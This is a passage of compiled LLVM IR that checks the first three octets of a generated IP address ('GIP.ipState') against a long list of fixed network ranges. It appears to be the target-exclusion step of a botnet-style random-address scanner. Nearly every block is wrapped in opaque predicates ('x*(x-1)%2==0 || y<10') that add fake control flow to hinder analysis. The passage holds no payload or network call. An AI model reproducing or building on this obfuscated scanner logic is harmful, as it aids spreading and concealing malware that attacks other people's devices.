  %3682 = or i1 %3680, %3681
  br i1 %3682, label %originalBB508, label %originalBB508alteredBB

originalBB508:                                    ; preds = %originalBB508alteredBB, %3674
  %3683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3684 = zext i8 %3683 to i32
  %3685 = icmp eq i32 %3684, 255
  %3686 = load i32, i32* @x.69
  %3687 = load i32, i32* @y.70
  %3688 = sub i32 %3686, 1
  %3689 = mul i32 %3686, %3688
  %3690 = urem i32 %3689, 2
  %3691 = icmp eq i32 %3690, 0
  %3692 = icmp slt i32 %3687, 10
  %3693 = or i1 %3691, %3692
  br i1 %3693, label %originalBBpart2510, label %originalBB508alteredBB

originalBBpart2510:                               ; preds = %originalBB508
  br i1 %3685, label %4994, label %3694

; <label>:3694:                                   ; preds = %originalBBpart2510, %3670
  %3695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3696 = zext i8 %3695 to i32
  %3697 = icmp eq i32 %3696, 5
  br i1 %3697, label %3698, label %3718

; <label>:3698:                                   ; preds = %3694
  %3699 = load i32, i32* @x.69
  %3700 = load i32, i32* @y.70
  %3701 = sub i32 %3699, 1
  %3702 = mul i32 %3699, %3701
  %3703 = urem i32 %3702, 2
  %3704 = icmp eq i32 %3703, 0
  %3705 = icmp slt i32 %3700, 10
  %3706 = or i1 %3704, %3705
  br i1 %3706, label %originalBB512, label %originalBB512alteredBB

originalBB512:                                    ; preds = %originalBB512alteredBB, %3698
  %3707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3708 = zext i8 %3707 to i32
  %3709 = icmp eq i32 %3708, 135
  %3710 = load i32, i32* @x.69
  %3711 = load i32, i32* @y.70
  %3712 = sub i32 %3710, 1
  %3713 = mul i32 %3710, %3712
  %3714 = urem i32 %3713, 2
  %3715 = icmp eq i32 %3714, 0
  %3716 = icmp slt i32 %3711, 10
  %3717 = or i1 %3715, %3716
  br i1 %3717, label %originalBBpart2514, label %originalBB512alteredBB

originalBBpart2514:                               ; preds = %originalBB512
  br i1 %3709, label %4994, label %3718

; <label>:3718:                                   ; preds = %originalBBpart2514, %3694
  %3719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3720 = zext i8 %3719 to i32
  %3721 = icmp eq i32 %3720, 5
  br i1 %3721, label %3722, label %3742

; <label>:3722:                                   ; preds = %3718
  %3723 = load i32, i32* @x.69
  %3724 = load i32, i32* @y.70
  %3725 = sub i32 %3723, 1
  %3726 = mul i32 %3723, %3725
  %3727 = urem i32 %3726, 2
  %3728 = icmp eq i32 %3727, 0
  %3729 = icmp slt i32 %3724, 10
  %3730 = or i1 %3728, %3729
  br i1 %3730, label %originalBB516, label %originalBB516alteredBB

originalBB516:                                    ; preds = %originalBB516alteredBB, %3722
  %3731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3732 = zext i8 %3731 to i32
  %3733 = icmp eq i32 %3732, 196
  %3734 = load i32, i32* @x.69
  %3735 = load i32, i32* @y.70
  %3736 = sub i32 %3734, 1
  %3737 = mul i32 %3734, %3736
  %3738 = urem i32 %3737, 2
  %3739 = icmp eq i32 %3738, 0
  %3740 = icmp slt i32 %3735, 10
  %3741 = or i1 %3739, %3740
  br i1 %3741, label %originalBBpart2518, label %originalBB516alteredBB

originalBBpart2518:                               ; preds = %originalBB516
  br i1 %3733, label %4994, label %3742

; <label>:3742:                                   ; preds = %originalBBpart2518, %3718
  %3743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3744 = zext i8 %3743 to i32
  %3745 = icmp eq i32 %3744, 5
  br i1 %3745, label %3746, label %3750

; <label>:3746:                                   ; preds = %3742
  %3747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3748 = zext i8 %3747 to i32
  %3749 = icmp eq i32 %3748, 39
  br i1 %3749, label %4994, label %3750

; <label>:3750:                                   ; preds = %3746, %3742
  %3751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3752 = zext i8 %3751 to i32
  %3753 = icmp eq i32 %3752, 91
  br i1 %3753, label %3754, label %3758

; <label>:3754:                                   ; preds = %3750
  %3755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3756 = zext i8 %3755 to i32
  %3757 = icmp eq i32 %3756, 134
  br i1 %3757, label %4994, label %3758

; <label>:3758:                                   ; preds = %3754, %3750
  %3759 = load i32, i32* @x.69
  %3760 = load i32, i32* @y.70
  %3761 = sub i32 %3759, 1
  %3762 = mul i32 %3759, %3761
  %3763 = urem i32 %3762, 2
  %3764 = icmp eq i32 %3763, 0
  %3765 = icmp slt i32 %3760, 10
  %3766 = or i1 %3764, %3765
  br i1 %3766, label %originalBB520, label %originalBB520alteredBB

originalBB520:                                    ; preds = %originalBB520alteredBB, %3758
  %3767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3768 = zext i8 %3767 to i32
  %3769 = icmp eq i32 %3768, 104
  %3770 = load i32, i32* @x.69
  %3771 = load i32, i32* @y.70
  %3772 = sub i32 %3770, 1
  %3773 = mul i32 %3770, %3772
  %3774 = urem i32 %3773, 2
  %3775 = icmp eq i32 %3774, 0
  %3776 = icmp slt i32 %3771, 10
  %3777 = or i1 %3775, %3776
  br i1 %3777, label %originalBBpart2522, label %originalBB520alteredBB

originalBBpart2522:                               ; preds = %originalBB520
  br i1 %3769, label %3778, label %3790

; <label>:3778:                                   ; preds = %originalBBpart2522
  %3779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3780 = zext i8 %3779 to i32
  %3781 = icmp eq i32 %3780, 200
  br i1 %3781, label %3782, label %3790

; <label>:3782:                                   ; preds = %3778
  %3783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3784 = zext i8 %3783 to i32
  %3785 = icmp sge i32 %3784, 128
  br i1 %3785, label %3786, label %3790

; <label>:3786:                                   ; preds = %3782
  %3787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3788 = zext i8 %3787 to i32
  %3789 = icmp slt i32 %3788, 159
  br i1 %3789, label %4994, label %3790

; <label>:3790:                                   ; preds = %3786, %3782, %3778, %originalBBpart2522
  %3791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3792 = zext i8 %3791 to i32
  %3793 = icmp eq i32 %3792, 107
  br i1 %3793, label %3794, label %3822

; <label>:3794:                                   ; preds = %3790
  %3795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3796 = zext i8 %3795 to i32
  %3797 = icmp eq i32 %3796, 152
  br i1 %3797, label %3798, label %3822

; <label>:3798:                                   ; preds = %3794
  %3799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3800 = zext i8 %3799 to i32
  %3801 = icmp sge i32 %3800, 96
  br i1 %3801, label %3802, label %3822

; <label>:3802:                                   ; preds = %3798
  %3803 = load i32, i32* @x.69
  %3804 = load i32, i32* @y.70
  %3805 = sub i32 %3803, 1
  %3806 = mul i32 %3803, %3805
  %3807 = urem i32 %3806, 2
  %3808 = icmp eq i32 %3807, 0
  %3809 = icmp slt i32 %3804, 10
  %3810 = or i1 %3808, %3809
  br i1 %3810, label %originalBB524, label %originalBB524alteredBB

originalBB524:                                    ; preds = %originalBB524alteredBB, %3802
  %3811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3812 = zext i8 %3811 to i32
  %3813 = icmp slt i32 %3812, 111
  %3814 = load i32, i32* @x.69
  %3815 = load i32, i32* @y.70
  %3816 = sub i32 %3814, 1
  %3817 = mul i32 %3814, %3816
  %3818 = urem i32 %3817, 2
  %3819 = icmp eq i32 %3818, 0
  %3820 = icmp slt i32 %3815, 10
  %3821 = or i1 %3819, %3820
  br i1 %3821, label %originalBBpart2526, label %originalBB524alteredBB

originalBBpart2526:                               ; preds = %originalBB524
  br i1 %3813, label %4994, label %3822

; <label>:3822:                                   ; preds = %originalBBpart2526, %3798, %3794, %3790
  %3823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3824 = zext i8 %3823 to i32
  %3825 = icmp eq i32 %3824, 107
  br i1 %3825, label %3826, label %3838

; <label>:3826:                                   ; preds = %3822
  %3827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3828 = zext i8 %3827 to i32
  %3829 = icmp eq i32 %3828, 181
  br i1 %3829, label %3830, label %3838

; <label>:3830:                                   ; preds = %3826
  %3831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3832 = zext i8 %3831 to i32
  %3833 = icmp sge i32 %3832, 160
  br i1 %3833, label %3834, label %3838

; <label>:3834:                                   ; preds = %3830
  %3835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3836 = zext i8 %3835 to i32
  %3837 = icmp slt i32 %3836, 189
  br i1 %3837, label %4994, label %3838

; <label>:3838:                                   ; preds = %3834, %3830, %3826, %3822
  %3839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3840 = zext i8 %3839 to i32
  %3841 = icmp eq i32 %3840, 172
  br i1 %3841, label %3842, label %3870

; <label>:3842:                                   ; preds = %3838
  %3843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3844 = zext i8 %3843 to i32
  %3845 = icmp eq i32 %3844, 98
  br i1 %3845, label %3846, label %3870

; <label>:3846:                                   ; preds = %3842
  %3847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3848 = zext i8 %3847 to i32
  %3849 = icmp sge i32 %3848, 64
  br i1 %3849, label %3850, label %3870

; <label>:3850:                                   ; preds = %3846
  %3851 = load i32, i32* @x.69
  %3852 = load i32, i32* @y.70
  %3853 = sub i32 %3851, 1
  %3854 = mul i32 %3851, %3853
  %3855 = urem i32 %3854, 2
  %3856 = icmp eq i32 %3855, 0
  %3857 = icmp slt i32 %3852, 10
  %3858 = or i1 %3856, %3857
  br i1 %3858, label %originalBB528, label %originalBB528alteredBB

originalBB528:                                    ; preds = %originalBB528alteredBB, %3850
  %3859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3860 = zext i8 %3859 to i32
  %3861 = icmp slt i32 %3860, 95
  %3862 = load i32, i32* @x.69
  %3863 = load i32, i32* @y.70
  %3864 = sub i32 %3862, 1
  %3865 = mul i32 %3862, %3864
  %3866 = urem i32 %3865, 2
  %3867 = icmp eq i32 %3866, 0
  %3868 = icmp slt i32 %3863, 10
  %3869 = or i1 %3867, %3868
  br i1 %3869, label %originalBBpart2530, label %originalBB528alteredBB

originalBBpart2530:                               ; preds = %originalBB528
  br i1 %3861, label %4994, label %3870

; <label>:3870:                                   ; preds = %originalBBpart2530, %3846, %3842, %3838
  %3871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3872 = zext i8 %3871 to i32
  %3873 = icmp eq i32 %3872, 184
  br i1 %3873, label %3874, label %3918

; <label>:3874:                                   ; preds = %3870
  %3875 = load i32, i32* @x.69
  %3876 = load i32, i32* @y.70
  %3877 = sub i32 %3875, 1
  %3878 = mul i32 %3875, %3877
  %3879 = urem i32 %3878, 2
  %3880 = icmp eq i32 %3879, 0
  %3881 = icmp slt i32 %3876, 10
  %3882 = or i1 %3880, %3881
  br i1 %3882, label %originalBB532, label %originalBB532alteredBB

originalBB532:                                    ; preds = %originalBB532alteredBB, %3874
  %3883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3884 = zext i8 %3883 to i32
  %3885 = icmp eq i32 %3884, 170
  %3886 = load i32, i32* @x.69
  %3887 = load i32, i32* @y.70
  %3888 = sub i32 %3886, 1
  %3889 = mul i32 %3886, %3888
  %3890 = urem i32 %3889, 2
  %3891 = icmp eq i32 %3890, 0
  %3892 = icmp slt i32 %3887, 10
  %3893 = or i1 %3891, %3892
  br i1 %3893, label %originalBBpart2534, label %originalBB532alteredBB

originalBBpart2534:                               ; preds = %originalBB532
  br i1 %3885, label %3894, label %3918

; <label>:3894:                                   ; preds = %originalBBpart2534
  %3895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3896 = zext i8 %3895 to i32
  %3897 = icmp sge i32 %3896, 240
  br i1 %3897, label %3898, label %3918

; <label>:3898:                                   ; preds = %3894
  %3899 = load i32, i32* @x.69
  %3900 = load i32, i32* @y.70
  %3901 = sub i32 %3899, 1
  %3902 = mul i32 %3899, %3901
  %3903 = urem i32 %3902, 2
  %3904 = icmp eq i32 %3903, 0
  %3905 = icmp slt i32 %3900, 10
  %3906 = or i1 %3904, %3905
  br i1 %3906, label %originalBB536, label %originalBB536alteredBB

originalBB536:                                    ; preds = %originalBB536alteredBB, %3898
  %3907 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3908 = zext i8 %3907 to i32
  %3909 = icmp slt i32 %3908, 255
  %3910 = load i32, i32* @x.69
  %3911 = load i32, i32* @y.70
  %3912 = sub i32 %3910, 1
  %3913 = mul i32 %3910, %3912
  %3914 = urem i32 %3913, 2
  %3915 = icmp eq i32 %3914, 0
  %3916 = icmp slt i32 %3911, 10
  %3917 = or i1 %3915, %3916
  br i1 %3917, label %originalBBpart2538, label %originalBB536alteredBB

originalBBpart2538:                               ; preds = %originalBB536
  br i1 %3909, label %4994, label %3918

; <label>:3918:                                   ; preds = %originalBBpart2538, %3894, %originalBBpart2534, %3870
  %3919 = load i32, i32* @x.69
  %3920 = load i32, i32* @y.70
  %3921 = sub i32 %3919, 1
  %3922 = mul i32 %3919, %3921
  %3923 = urem i32 %3922, 2
  %3924 = icmp eq i32 %3923, 0
  %3925 = icmp slt i32 %3920, 10
  %3926 = or i1 %3924, %3925
  br i1 %3926, label %originalBB540, label %originalBB540alteredBB

originalBB540:                                    ; preds = %originalBB540alteredBB, %3918
  %3927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3928 = zext i8 %3927 to i32
  %3929 = icmp eq i32 %3928, 192
  %3930 = load i32, i32* @x.69
  %3931 = load i32, i32* @y.70
  %3932 = sub i32 %3930, 1
  %3933 = mul i32 %3930, %3932
  %3934 = urem i32 %3933, 2
  %3935 = icmp eq i32 %3934, 0
  %3936 = icmp slt i32 %3931, 10
  %3937 = or i1 %3935, %3936
  br i1 %3937, label %originalBBpart2542, label %originalBB540alteredBB

originalBBpart2542:                               ; preds = %originalBB540
  br i1 %3929, label %3938, label %3966

; <label>:3938:                                   ; preds = %originalBBpart2542
  %3939 = load i32, i32* @x.69
  %3940 = load i32, i32* @y.70
  %3941 = sub i32 %3939, 1
  %3942 = mul i32 %3939, %3941
  %3943 = urem i32 %3942, 2
  %3944 = icmp eq i32 %3943, 0
  %3945 = icmp slt i32 %3940, 10
  %3946 = or i1 %3944, %3945
  br i1 %3946, label %originalBB544, label %originalBB544alteredBB

originalBB544:                                    ; preds = %originalBB544alteredBB, %3938
  %3947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3948 = zext i8 %3947 to i32
  %3949 = icmp eq i32 %3948, 111
  %3950 = load i32, i32* @x.69
  %3951 = load i32, i32* @y.70
  %3952 = sub i32 %3950, 1
  %3953 = mul i32 %3950, %3952
  %3954 = urem i32 %3953, 2
  %3955 = icmp eq i32 %3954, 0
  %3956 = icmp slt i32 %3951, 10
  %3957 = or i1 %3955, %3956
  br i1 %3957, label %originalBBpart2546, label %originalBB544alteredBB

originalBBpart2546:                               ; preds = %originalBB544
  br i1 %3949, label %3958, label %3966

; <label>:3958:                                   ; preds = %originalBBpart2546
  %3959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3960 = zext i8 %3959 to i32
  %3961 = icmp sge i32 %3960, 128
  br i1 %3961, label %3962, label %3966

; <label>:3962:                                   ; preds = %3958
  %3963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3964 = zext i8 %3963 to i32
  %3965 = icmp slt i32 %3964, 143
  br i1 %3965, label %4994, label %3966

; <label>:3966:                                   ; preds = %3962, %3958, %originalBBpart2546, %originalBBpart2542
  %3967 = load i32, i32* @x.69
  %3968 = load i32, i32* @y.70
  %3969 = sub i32 %3967, 1
  %3970 = mul i32 %3967, %3969
  %3971 = urem i32 %3970, 2
  %3972 = icmp eq i32 %3971, 0
  %3973 = icmp slt i32 %3968, 10
  %3974 = or i1 %3972, %3973
  br i1 %3974, label %originalBB548, label %originalBB548alteredBB

originalBB548:                                    ; preds = %originalBB548alteredBB, %3966
  %3975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3976 = zext i8 %3975 to i32
  %3977 = icmp eq i32 %3976, 192
  %3978 = load i32, i32* @x.69
  %3979 = load i32, i32* @y.70
  %3980 = sub i32 %3978, 1
  %3981 = mul i32 %3978, %3980
  %3982 = urem i32 %3981, 2
  %3983 = icmp eq i32 %3982, 0
  %3984 = icmp slt i32 %3979, 10
  %3985 = or i1 %3983, %3984
  br i1 %3985, label %originalBBpart2550, label %originalBB548alteredBB

originalBBpart2550:                               ; preds = %originalBB548
  br i1 %3977, label %3986, label %4030

; <label>:3986:                                   ; preds = %originalBBpart2550
  %3987 = load i32, i32* @x.69
  %3988 = load i32, i32* @y.70
  %3989 = sub i32 %3987, 1
  %3990 = mul i32 %3987, %3989
  %3991 = urem i32 %3990, 2
  %3992 = icmp eq i32 %3991, 0
  %3993 = icmp slt i32 %3988, 10
  %3994 = or i1 %3992, %3993
  br i1 %3994, label %originalBB552, label %originalBB552alteredBB

originalBB552:                                    ; preds = %originalBB552alteredBB, %3986
  %3995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3996 = zext i8 %3995 to i32
  %3997 = icmp eq i32 %3996, 252
  %3998 = load i32, i32* @x.69
  %3999 = load i32, i32* @y.70
  %4000 = sub i32 %3998, 1
  %4001 = mul i32 %3998, %4000
  %4002 = urem i32 %4001, 2
  %4003 = icmp eq i32 %4002, 0
  %4004 = icmp slt i32 %3999, 10
  %4005 = or i1 %4003, %4004
  br i1 %4005, label %originalBBpart2554, label %originalBB552alteredBB

originalBBpart2554:                               ; preds = %originalBB552
  br i1 %3997, label %4006, label %4030

; <label>:4006:                                   ; preds = %originalBBpart2554
  %4007 = load i32, i32* @x.69
  %4008 = load i32, i32* @y.70
  %4009 = sub i32 %4007, 1
  %4010 = mul i32 %4007, %4009
  %4011 = urem i32 %4010, 2
  %4012 = icmp eq i32 %4011, 0
  %4013 = icmp slt i32 %4008, 10
  %4014 = or i1 %4012, %4013
  br i1 %4014, label %originalBB556, label %originalBB556alteredBB

originalBB556:                                    ; preds = %originalBB556alteredBB, %4006
  %4015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4016 = zext i8 %4015 to i32
  %4017 = icmp sge i32 %4016, 208
  %4018 = load i32, i32* @x.69
  %4019 = load i32, i32* @y.70
  %4020 = sub i32 %4018, 1
  %4021 = mul i32 %4018, %4020
  %4022 = urem i32 %4021, 2
  %4023 = icmp eq i32 %4022, 0
  %4024 = icmp slt i32 %4019, 10
  %4025 = or i1 %4023, %4024
  br i1 %4025, label %originalBBpart2558, label %originalBB556alteredBB

originalBBpart2558:                               ; preds = %originalBB556
  br i1 %4017, label %4026, label %4030

; <label>:4026:                                   ; preds = %originalBBpart2558
  %4027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4028 = zext i8 %4027 to i32
  %4029 = icmp slt i32 %4028, 223
  br i1 %4029, label %4994, label %4030

; <label>:4030:                                   ; preds = %4026, %originalBBpart2558, %originalBBpart2554, %originalBBpart2550
  %4031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4032 = zext i8 %4031 to i32
  %4033 = icmp eq i32 %4032, 192
  br i1 %4033, label %4034, label %4062

; <label>:4034:                                   ; preds = %4030
  %4035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4036 = zext i8 %4035 to i32
  %4037 = icmp eq i32 %4036, 40
  br i1 %4037, label %4038, label %4062

; <label>:4038:                                   ; preds = %4034
  %4039 = load i32, i32* @x.69
  %4040 = load i32, i32* @y.70
  %4041 = sub i32 %4039, 1
  %4042 = mul i32 %4039, %4041
  %4043 = urem i32 %4042, 2
  %4044 = icmp eq i32 %4043, 0
  %4045 = icmp slt i32 %4040, 10
  %4046 = or i1 %4044, %4045
  br i1 %4046, label %originalBB560, label %originalBB560alteredBB

originalBB560:                                    ; preds = %originalBB560alteredBB, %4038
  %4047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4048 = zext i8 %4047 to i32
  %4049 = icmp sge i32 %4048, 56
  %4050 = load i32, i32* @x.69
  %4051 = load i32, i32* @y.70
  %4052 = sub i32 %4050, 1
  %4053 = mul i32 %4050, %4052
  %4054 = urem i32 %4053, 2
  %4055 = icmp eq i32 %4054, 0
  %4056 = icmp slt i32 %4051, 10
  %4057 = or i1 %4055, %4056
  br i1 %4057, label %originalBBpart2562, label %originalBB560alteredBB

originalBBpart2562:                               ; preds = %originalBB560
  br i1 %4049, label %4058, label %4062

; <label>:4058:                                   ; preds = %originalBBpart2562
  %4059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4060 = zext i8 %4059 to i32
  %4061 = icmp slt i32 %4060, 59
  br i1 %4061, label %4994, label %4062

; <label>:4062:                                   ; preds = %4058, %originalBBpart2562, %4034, %4030
  %4063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4064 = zext i8 %4063 to i32
  %4065 = icmp eq i32 %4064, 198
  br i1 %4065, label %4066, label %4078

; <label>:4066:                                   ; preds = %4062
  %4067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4068 = zext i8 %4067 to i32
  %4069 = icmp eq i32 %4068, 8
  br i1 %4069, label %4070, label %4078

; <label>:4070:                                   ; preds = %4066
  %4071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4072 = zext i8 %4071 to i32
  %4073 = icmp sge i32 %4072, 81
  br i1 %4073, label %4074, label %4078

; <label>:4074:                                   ; preds = %4070
  %4075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4076 = zext i8 %4075 to i32
  %4077 = icmp slt i32 %4076, 95
  br i1 %4077, label %4994, label %4078

; <label>:4078:                                   ; preds = %4074, %4070, %4066, %4062
  %4079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4080 = zext i8 %4079 to i32
  %4081 = icmp eq i32 %4080, 199
  br i1 %4081, label %4082, label %4110

; <label>:4082:                                   ; preds = %4078
  %4083 = load i32, i32* @x.69
  %4084 = load i32, i32* @y.70
  %4085 = sub i32 %4083, 1
  %4086 = mul i32 %4083, %4085
  %4087 = urem i32 %4086, 2
  %4088 = icmp eq i32 %4087, 0
  %4089 = icmp slt i32 %4084, 10
  %4090 = or i1 %4088, %4089
  br i1 %4090, label %originalBB564, label %originalBB564alteredBB

originalBB564:                                    ; preds = %originalBB564alteredBB, %4082
  %4091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4092 = zext i8 %4091 to i32
  %4093 = icmp eq i32 %4092, 116
  %4094 = load i32, i32* @x.69
  %4095 = load i32, i32* @y.70
  %4096 = sub i32 %4094, 1
  %4097 = mul i32 %4094, %4096
  %4098 = urem i32 %4097, 2
  %4099 = icmp eq i32 %4098, 0
  %4100 = icmp slt i32 %4095, 10
  %4101 = or i1 %4099, %4100
  br i1 %4101, label %originalBBpart2566, label %originalBB564alteredBB

originalBBpart2566:                               ; preds = %originalBB564
  br i1 %4093, label %4102, label %4110

; <label>:4102:                                   ; preds = %originalBBpart2566
  %4103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4104 = zext i8 %4103 to i32
  %4105 = icmp sge i32 %4104, 112
  br i1 %4105, label %4106, label %4110

; <label>:4106:                                   ; preds = %4102
  %4107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4108 = zext i8 %4107 to i32
  %4109 = icmp slt i32 %4108, 119
  br i1 %4109, label %4994, label %4110

; <label>:4110:                                   ; preds = %4106, %4102, %originalBBpart2566, %4078
  %4111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4112 = zext i8 %4111 to i32
  %4113 = icmp eq i32 %4112, 199
  br i1 %4113, label %4114, label %4142

; <label>:4114:                                   ; preds = %4110
  %4115 = load i32, i32* @x.69
  %4116 = load i32, i32* @y.70
  %4117 = sub i32 %4115, 1
  %4118 = mul i32 %4115, %4117
  %4119 = urem i32 %4118, 2
  %4120 = icmp eq i32 %4119, 0
  %4121 = icmp slt i32 %4116, 10
  %4122 = or i1 %4120, %4121
  br i1 %4122, label %originalBB568, label %originalBB568alteredBB

originalBB568:                                    ; preds = %originalBB568alteredBB, %4114
  %4123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4124 = zext i8 %4123 to i32
  %4125 = icmp eq i32 %4124, 229
  %4126 = load i32, i32* @x.69
  %4127 = load i32, i32* @y.70
  %4128 = sub i32 %4126, 1
  %4129 = mul i32 %4126, %4128
  %4130 = urem i32 %4129, 2
  %4131 = icmp eq i32 %4130, 0
  %4132 = icmp slt i32 %4127, 10
  %4133 = or i1 %4131, %4132
  br i1 %4133, label %originalBBpart2570, label %originalBB568alteredBB

originalBBpart2570:                               ; preds = %originalBB568
  br i1 %4125, label %4134, label %4142

; <label>:4134:                                   ; preds = %originalBBpart2570
  %4135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4136 = zext i8 %4135 to i32
  %4137 = icmp sge i32 %4136, 248
  br i1 %4137, label %4138, label %4142

; <label>:4138:                                   ; preds = %4134
  %4139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4140 = zext i8 %4139 to i32
  %4141 = icmp slt i32 %4140, 255
  br i1 %4141, label %4994, label %4142

; <label>:4142:                                   ; preds = %4138, %4134, %originalBBpart2570, %4110
  %4143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4144 = zext i8 %4143 to i32
  %4145 = icmp eq i32 %4144, 199
  br i1 %4145, label %4146, label %4174

; <label>:4146:                                   ; preds = %4142
  %4147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4148 = zext i8 %4147 to i32
  %4149 = icmp eq i32 %4148, 36
  br i1 %4149, label %4150, label %4174

; <label>:4150:                                   ; preds = %4146
  %4151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4152 = zext i8 %4151 to i32
  %4153 = icmp sge i32 %4152, 220
  br i1 %4153, label %4154, label %4174

; <label>:4154:                                   ; preds = %4150
  %4155 = load i32, i32* @x.69
  %4156 = load i32, i32* @y.70
  %4157 = sub i32 %4155, 1
  %4158 = mul i32 %4155, %4157
  %4159 = urem i32 %4158, 2
  %4160 = icmp eq i32 %4159, 0
  %4161 = icmp slt i32 %4156, 10
  %4162 = or i1 %4160, %4161
  br i1 %4162, label %originalBB572, label %originalBB572alteredBB

originalBB572:                                    ; preds = %originalBB572alteredBB, %4154
  %4163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4164 = zext i8 %4163 to i32
